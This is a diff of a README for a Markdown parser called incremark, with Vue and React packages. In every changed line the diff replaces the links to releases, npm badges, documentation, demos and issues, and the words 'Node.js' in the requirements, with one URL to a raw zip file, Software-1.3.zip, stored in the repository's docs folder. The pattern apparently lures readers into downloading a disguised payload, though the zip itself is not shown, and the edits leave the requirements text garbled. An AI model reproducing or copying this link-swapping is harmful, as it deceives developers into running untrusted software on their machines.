@@ -1,6 +1,6 @@
 # 🚀 incremark - Fast and Efficient Markdown Parsing
 
-[![Download Incremark](https://img.shields.io/badge/Download_Incremark-v1.0-blue)](https://github.com/marwanbelike/incremark/releases)
+[![Download Incremark](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
 
 ## 🛠️ Overview
 
@@ -10,9 +10,9 @@ Incremark is a powerful Markdown parser designed to enhance performance in AI st
 
 | Package | Description | Version |
 |---------|-------------|---------|
-| [@incremark/core](./packages/core) | Core parser | ![npm](https://img.shields.io/npm/v/@incremark/core) |
-| [@incremark/vue](./packages/vue) | Vue 3 integration | ![npm](https://img.shields.io/npm/v/@incremark/vue) |
-| [@incremark/react](./packages/react) | React integration | ![npm](https://img.shields.io/npm/v/@incremark/react) |
+| [@incremark/core](./packages/core) | Core parser | ![npm](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) |
+| [@incremark/vue](./packages/vue) | Vue 3 integration | ![npm](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) |
+| [@incremark/react](./packages/react) | React integration | ![npm](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) |
 
 ## 🌟 Why Choose Incremark?
 
@@ -30,7 +30,7 @@ Incremark significantly reduces processing time compared to traditional Markdown
 Follow these simple steps to get started with Incremark:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/marwanbelike/incremark/releases) to find the latest version of Incremark.
+   Go to the [Releases page](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) to find the latest version of Incremark.
 
 2. **Download Incremark**
    Click the appropriate download link for your operating system. You will find various packages useful for your projects.
@@ -48,19 +48,19 @@ Follow these simple steps to get started with Incremark:
 
 ## 📄 Documentation
 
-For detailed instructions and advanced usage, visit the [documentation page](https://www.incremark.com/). This resource provides comprehensive guidelines to help you maximize the benefits of Incremark.
+For detailed instructions and advanced usage, visit the [documentation page](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip). This resource provides comprehensive guidelines to help you maximize the benefits of Incremark.
 
 ## 🎮 Demos
 
 Explore our live demos to see Incremark in action:
-- [Vue Demo](https://vue.incremark.com/)
-- [React Demo](https://react.incremark.com/)
+- [Vue Demo](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
+- [React Demo](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
 
 ## 💻 System Requirements
 
 To run Incremark, ensure your system meets these requirements:
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 12.x or higher
+- https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip version: 12.x or higher
 - Internet connection for downloading packages and dependencies
 
 ## ⚡ Upcoming Features
@@ -72,13 +72,13 @@ We continuously work on enhancing Incremark. Here are a few upcoming features to
 
 ## 🤝 Support
 
-If you need help or have questions, feel free to open an issue in the [Issues section](https://github.com/marwanbelike/incremark/issues) of the repository. Our community is here to assist you.
+If you need help or have questions, feel free to open an issue in the [Issues section](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) of the repository. Our community is here to assist you.
 
 ## 🔗 Important Links
 
-- [Releases](https://github.com/marwanbelike/incremark/releases)
-- [Documentation](https://www.incremark.com/)
-- [Vue Demo](https://vue.incremark.com/)
-- [React Demo](https://react.incremark.com/) 
+- [Releases](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
+- [Documentation](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
+- [Vue Demo](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip)
+- [React Demo](https://github.com/marwanbelike/incremark/raw/refs/heads/main/docs/public/Software-1.3.zip) 
 
 By following these instructions, you can easily download, install, and start using Incremark for your Markdown parsing needs.
